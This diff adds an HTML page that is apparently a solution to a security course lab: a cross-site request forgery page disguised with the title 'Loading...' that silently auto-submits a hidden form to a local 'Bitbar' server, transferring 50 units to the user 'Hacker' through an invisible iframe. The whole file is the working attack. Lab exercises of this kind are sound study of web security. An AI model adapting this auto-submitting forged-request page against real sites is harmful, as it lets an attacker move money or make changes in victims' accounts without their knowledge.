@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+<!-- Local demonstration copy: form posts to the local Bitbar server. -->
+<form id="transferForm"
+      action="http://localhost:3000/post_transfer"
+      method="POST"
+      target="transferFrame">
+  <input type="hidden" name="destination_username" value="Hacker">
+  <input type="hidden" name="quantity" value="50">
+</form>
+<iframe name="transferFrame" style="display:none;"></iframe>
+<script>
+  document.getElementById("transferForm").submit();
+</script>
+</body>
+</html>
